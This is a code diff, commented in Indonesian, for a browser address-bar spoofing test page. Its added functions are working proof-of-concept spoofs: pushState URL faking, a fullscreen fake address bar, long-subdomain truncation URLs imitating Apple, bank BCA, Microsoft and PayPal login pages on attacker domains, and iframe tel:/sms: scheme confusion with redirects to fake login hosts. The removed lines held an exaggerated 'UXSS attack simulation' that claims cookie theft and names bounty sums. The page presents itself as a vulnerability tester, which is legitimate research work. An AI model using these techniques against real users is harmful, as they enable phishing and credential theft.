+                window.history.pushState({}, "Test Spoof", "https://www.apple.com/id/mac/");
+                statusDiv.innerHTML = "✅ history.pushState() menulis URL palsu: https://www.apple.com/id/mac/<br> ⏳ Menunggu navigasi...";
+                if (shouldNavigate) {
                     setTimeout(() => {
-                        log('[4/5] Injecting fake login form...', 'warning');
-                        document.getElementById('fakeLoginPanel').style.display = 'block';
-                        
+                        location.href = "https://example.com/security-test";
+                        statusDiv.innerHTML += "<br>🔄 Navigasi ke example.com. <strong>CEK ADDRESS BAR:</strong> masih apple.com? → RAWAN.";
+                    }, 150);
+                } else {
+                    statusDiv.innerHTML += "<br>⚠️ Mode hanya pushState (tanpa navigasi), periksa address bar apakah berubah.";
+                }
+            } catch(e) {
+                statusDiv.innerHTML = "❌ Gagal: " + e.toString();
+            }
+        }
+
+        // 2. FULLSCREEN SPOOF (cek notifikasi toast)
+        function runFullscreenSpoof() {
+            const statusDiv = document.getElementById('fullscreenStatus');
+            if (document.documentElement.requestFullscreen) {
+                document.documentElement.requestFullscreen().then(() => {
+                    statusDiv.innerHTML = "🔲 LAYAR PENUH AKTIF. Perhatikan: apakah browser menampilkan <strong>toast/notification</strong>?<br> ➕ Jika tidak ada notifikasi → celah CVE-2025-13132.";
+                    // bikin elemen floating palsu (optional)
+                    let fakeBar = document.createElement('div');
+                    fakeBar.id = "_spoofAddressTest";
+                    fakeBar.style.position = "fixed";
+                    fakeBar.style.top = "0";
+                    fakeBar.style.left = "0";
+                    fakeBar.style.width = "100%";
+                    fakeBar.style.background = "black";
+                    fakeBar.style.color = "white";
+                    fakeBar.style.fontFamily = "monospace";
+                    fakeBar.style.padding = "12px";
+                    fakeBar.style.zIndex = "999999";
+                    fakeBar.style.textAlign = "center";
+                    fakeBar.innerText = "🔒 https://www.google.com [PALSU] — jika notifikasi fullscreen tidak muncul, ini berbahaya.";
+                    document.body.appendChild(fakeBar);
+                    setTimeout(() => fakeBar.remove(), 8000);
+                }).catch(err => {
+                    statusDiv.innerHTML = "❌ Gagal fullscreen: " + err;
+                });
+            } else {
+                statusDiv.innerHTML = "❌ Browser tidak mendukung fullscreen API";
+            }
+        }
+
+        // 3. Subdomain truncation attack (CVE-2026-44659 style)
+        function runTruncationTest() {
+            const longSub = "login-appleid-verify-thisisaverylongsubdomaintotriggertruncationinzenbrowserandothers-" + "x".repeat(120);
+            const maliciousDomain = "evil-attacker.com";
+            const spoofedURL = `https://${longSub}.apple.com.${maliciousDomain}/secure/login`;
+            const statusDiv = document.getElementById('truncateStatus');
+            statusDiv.innerHTML = `⚠️ Mencoba navigasi ke URL panjang:<br><code style="font-size:0.7rem;">${spoofedURL.substring(0, 140)}...</code><br>🔎 Periksa address bar: apakah nama host terpotong? Apakah 'apple.com' masih terlihat jelas?`;
+            // langsung navigasi
+            location.href = spoofedURL;
+        }
+
+        function runTruncationNewTab() {
+            const longSub = "login-verify-bca-" + "a".repeat(140);
+            const spoofedURL = `https://${longSub}.bank-bca.com.malicios.net/payment`;
+            window.open(spoofedURL, '_blank');
+            const statusDiv = document.getElementById('truncateStatus');
+            statusDiv.innerHTML = `🆕 Tab baru dibuka dengan URL panjang. Cek address bar pada tab tersebut.`;
+        }
+
+        function runTruncationNewWindow() {
+            const longSub = "security-check-" + "b".repeat(150);
+            const spoofedURL = `https://${longSub}.microsoft-verify.attacker-domain.net/signin`;
+            window.open(spoofedURL, '_blank', "width=900,height=700");
+            document.getElementById('truncateStatus').innerHTML = `🪟 Window baru dibuka. Cek truncation address bar.`;
+        }
+
+        // 4. Iframe URI confusion (CVE-2025-14812 style)
+        function iframeConfusionAttack() {
+            const statusDiv = document.getElementById('iframeStatus');
+            statusDiv.innerHTML = "🎭 Membuat iframe tersembunyi dengan skema tel:// , lalu mengganti top.location ...";
+            let ifr = document.createElement('iframe');
+            ifr.style.display = "none";
+            ifr.src = "tel://1-888-555-0199";
+            document.body.appendChild(ifr);
+            setTimeout(() => {
+                try {
+                    // manipulasi lokasi setelah iframe scheme navigation
+                    top.location.href = "https://accounts-google.com.fake-login.page";
+                    statusDiv.innerHTML += "<br>🔄 Navigasi ke halaman palsu. Cek address bar: apakah masih menampilkan URL sebelumnya?";
+                } catch(e) { statusDiv.innerHTML += "<br>❌ Gagal top.location: " + e; }
+                setTimeout(() => ifr.remove(), 500);
+            }, 100);
+        }
+
+        function iframeConfusionNewTab() {
+            const newWin = window.open("about:blank", "_blank");
+            if (newWin) {
+                newWin.document.write(`
+                    <!DOCTYPE html>
+                    <html><head><title>Iframe spoofing test (Arc style)</title></head>
+                    <body>
+                        <h2>Uji iframe scheme confusion</h2>
+                        <p>Perhatikan address bar dalam 2 detik.</p>
+                        <script>
+                            let ifr = document.createElement('iframe');
+                            ifr.src = "tel://12345";
+                            ifr.style.display = "none";
+                            document.body.appendChild(ifr);
+                            setTimeout(() => {
+                                top.location.href = "https://www.paypal.com.secure-validate.xyz";
+                            }, 80);
+                        <\/script>
+                    </body></html>
+                `);
+                document.getElementById('iframeStatus').innerHTML = "🆕 Tab baru dengan uji iframe scheme + redirect. Cek apakah address bar spoofable.";
+            } else {
+                document.getElementById('iframeStatus').innerHTML = "❌ Popup diblokir? izinkan popup untuk uji coba.";
+            }
+        }
+
+        function iframeConfusionNewWindow() {
+            const win = window.open("", "_blank", "width=800,height=600");
+            if (win) {
+                win.document.write(`
+                    <html><body><h3>Iframe URI confusion (window)</h3>
+                    <p>Menguji apakah address bar dapat dispoof di window baru.</p>
+                    <script>
+                        let ifr = document.createElement('iframe');
+                        ifr.src = "sms://+123456";
+                        document.body.appendChild(ifr);
                         setTimeout(() => {
-                            log('[5/5] FULL ATTACK SIMULATION COMPLETE!', 'critical');
-                            log('💀 The attacker can now:', 'critical');
-                            log('   - Steal cookies from all domains', 'critical');
-                            log('   - Hijack user sessions', 'critical');
-                            log('   - Steal credentials via fake forms', 'critical');
-                            log('   - Access camera/microphone', 'critical');
-                            log('💰 Bounty potential: $50,000 - $250,000', 'success');
-                            
-                            alert('[POC] Full UXSS Attack Simulation Complete!\n\n' +
-                                  'Attack achieved:\n' +
-                                  '1. Cross-origin script execution on google.com\n' +
-                                  '2. Address bar spoofing\n' +
-                                  '3. Fake login form injection\n\n' +
-                                  'This demonstrates a REAL UXSS vulnerability!\n\n' +
-                                  'Bounty potential: $50k - $250k');
-                        }, 1000);
-                    }, 1000);
-                }, 1000);
-            }, 1000);
-        }, 2000);
-    }
-    
-    function resetAll() {
-        if (googleWindow && !googleWindow.closed) googleWindow.close();
-        googleWindow = null;
-        attackActive = false;
-        resetAddressBar();
-        document.getElementById('fakeLoginPanel').style.display = 'none';
-        const overlay = document.getElementById('fakeGoogleOverlay');
-        if (overlay) overlay.remove();
-        log('🔄 All states reset', 'info');
-    }
-    
-    // ============================================
-    // INITIALIZATION
-    // ============================================
-    updateOriginDisplay();
-    setInterval(updateOriginDisplay, 1000);
-    
-    // Browser detection
-    const ua = navigator.userAgent;
-    log(`Browser: ${ua.substring(0, 80)}`, 'info');
-    
-    if (/Chrome/.test(ua)) log('🎯 Chrome detected - window.name reuse should work', 'info');
-    if (/Safari/.test(ua) && !/Chrome/.test(ua)) log('🍎 Safari detected - about:blank inheritance may work', 'info');
-    if (/Arc/.test(ua)) log('🌀 Arc detected - Boost features may have additional vectors', 'info');
-    if (/Edg/.test(ua)) log('🌐 Edge detected - Chromium-based, similar to Chrome', 'info');
-    
-    log('========================================', 'info');
-    log('💡 TIPS FOR BEST RESULTS:', 'info');
-    log('   1. ALLOW POPUPS for this site (critical!)', 'warning');
-    log('   2. Try Technique #1 first (Window Name Reuse)', 'info');
-    log('   3. If popup blocked, click the blocked icon in address bar', 'info');
-    log('========================================', 'info');
+                            location.replace("https://appleid.apple.com.attacker.com/signin");
+                        }, 100);
+                    <\/script>
+                    </body></html>
+                `);
+                document.getElementById('iframeStatus').innerHTML = "🪟 Window baru dijalankan, periksa address bar setelah redirect.";
+            } else {
+                document.getElementById('iframeStatus').innerHTML = "⚠️ Ijinkan pop-up untuk window baru.";
+            }
+        }
+
+        // DAFTAR TOMBOL
+        document.getElementById('testPushStateSameTab').addEventListener('click', () => runHistoryPushStateSpoof(true));
+        document.getElementById('testPushStateNewTab').addEventListener('click', () => openTestInNewTab('pushstate'));
+        document.getElementById('testPushStateNewWindow').addEventListener('click', () => openTestInNewWindow('pushstate'));
+
+        document.getElementById('testFullscreenTab').addEventListener('click', () => runFullscreenSpoof());
+        document.getElementById('testFullscreenNewTab').addEventListener('click', () => openTestInNewTab('fullscreen'));
+        document.getElementById('testFullscreenNewWindow').addEventListener('click', () => openTestInNewWindow('fullscreen'));
+
+        document.getElementById('testTruncateTab').addEventListener('click', () => runTruncationTest());
+        document.getElementById('testTruncateNewTab').addEventListener('click', () => runTruncationNewTab());
+        document.getElementById('testTruncateNewWindow').addEventListener('click', () => runTruncationNewWindow());
+
+        document.getElementById('testIframeConfusionTab').addEventListener('click', () => iframeConfusionAttack());
+        document.getElementById('testIframeConfusionNewTab').addEventListener('click', () => iframeConfusionNewTab());
+        document.getElementById('testIframeConfusionNewWindow').addEventListener('click', () => iframeConfusionNewWindow());
+
+        // Auto-run jika ada parameter autoRun (untuk tab/window baru)
+        const autoRun = new URLSearchParams(window.location.search).get('autoRun');
+        if (autoRun === 'pushstate') {
+            runHistoryPushStateSpoof(true);
+        } else if (autoRun === 'fullscreen') {
+            setTimeout(() => runFullscreenSpoof(), 200);
+        } else if (autoRun === 'truncate') {
+            runTruncationTest();
+        } else if (autoRun === 'iframe') {
+            iframeConfusionAttack();
+        }
+    })();
 </script>
 </body>
 </html>
